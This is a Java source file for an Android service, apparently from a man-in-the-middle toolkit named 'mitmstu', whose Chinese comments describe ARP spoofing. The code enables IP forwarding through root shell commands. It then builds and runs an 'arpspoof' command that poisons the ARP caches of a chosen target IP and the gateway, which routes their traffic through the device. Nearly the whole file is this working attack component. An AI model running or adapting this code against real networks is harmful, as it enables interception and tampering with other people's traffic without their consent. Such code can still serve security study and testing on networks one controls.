
/**   
 * @Title: ArpService.java 
 * @Package: com.github.fdxxw.mitmstu.service 
 * @Description: TODO
 * @author fdxxw ucmxxw@163.com 
 * @date 2017年3月29日 下午6:47:35 
 */


package com.github.fdxxw.mitmstu.service;

import java.net.NetworkInterface;

import com.github.fdxxw.mitmstu.common.AppContext;
import com.github.fdxxw.mitmstu.utils.ShellUtils;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

/** 
 * @Description arp欺骗service
 * @author fdxxw ucmxxw@163.com
 * @date 2017年3月29日 下午6:47:35 
 */

public class ArpService extends Service {
    
    
    /** 开启端口转发命令 */
      	
    private String[] FORWARD_COMMANDS = {"echo 1 > /proc/sys/net/ipv4/ip_forward",
            "echo 1 > /proc/sys/net/ipv6/conf/all/forwarding"};
    
    
    /** 关闭端口转发命令 */
      	
    private String[] UN_FORWARD_COMMANDS = {"echo 0 > /proc/sys/net/ipv4/ip_forward",
            "echo 0 > /proc/sys/net/ipv6/conf/all/forwarding"};
    
    public final static int ONE_WAY_HOST = 0x1;  //单向欺骗主机
    
    /** arp攻击命令 */
      	
    private String arpSpoofCmd = null;
    
    /** arp欺骗线程*/
      	
    private Thread arpSpoof = null;
    
    /** 是否开启端口转发，默认开启*/
      	
    private boolean ipForward = true;
    
    /** arp欺骗方式 */
      	
    private int arpCheatWay = -1;
    
    /** 被攻击者的ip地址 */
      	
    private String targetIp;
    
    /**
     * @param intent
     * @param flags
     * @param startId
     * @return 
     * @see android.app.Service#onStartCommand(android.content.Intent, int, int) 
     */ 
    	
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ShellUtils.execCommand("killall arpspoof", true, false, true);
        
        ipForward = intent.getBooleanExtra("ipForward", true);
        if(ipForward) {
            ShellUtils.execCommand(FORWARD_COMMANDS, true, false, true);
        } else {
            ShellUtils.execCommand(UN_FORWARD_COMMANDS, true, false, true);
        }
        //网卡接口名
        String interfaceName = null;
        try {
            interfaceName = AppContext.getNetInterface();
        } catch(Exception e) {
            e.printStackTrace();
            try {
                interfaceName = NetworkInterface.getByInetAddress(AppContext.getmInetAddress()).getDisplayName();
            } catch(Exception exc) {
                exc.printStackTrace();
            }
        }
        arpCheatWay = intent.getIntExtra("arpCheatWay", -1);
        if((ONE_WAY_HOST & arpCheatWay) != 0) {
            if(null == targetIp) {
                targetIp = AppContext.getTarget().getIp();
            }
            if(!targetIp.equals(AppContext.getGateway())) {
                arpSpoofCmd = "arpspoof -i " + interfaceName + " -t " + targetIp 
                        + " " + AppContext.getGateway();
            } else {
                arpSpoofCmd = "arpspoof -i " + interfaceName + " -t " + AppContext.getGateway()
                        + " " + targetIp;
            }
            arpSpoof = new Thread() {
                	
                @Override
                public void run() {
                    ShellUtils.execCommand(arpSpoofCmd, true, false, false);
                }  
            };
            
            arpSpoof.start();
        }
        return super.onStartCommand(intent, flags, startId);
    }
    
    /**
     * Description  
     * @see android.app.Service#onDestroy() 
     */ 
    	
    @Override
    public void onDestroy() {
        if(arpSpoof != null) {
            arpSpoof.interrupt();
            arpSpoof = null;
        }
        //停止所有arpspoof job
        new Thread() {
            @Override
            public void run() {
                ShellUtils.execCommand("killall arpspoof", true, false, true);
            }
        }.start();
        super.onDestroy();
    }
    
    /**
     * @param arg0
     * @return 
     * @see android.app.Service#onBind(android.content.Intent) 
     */

    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

}
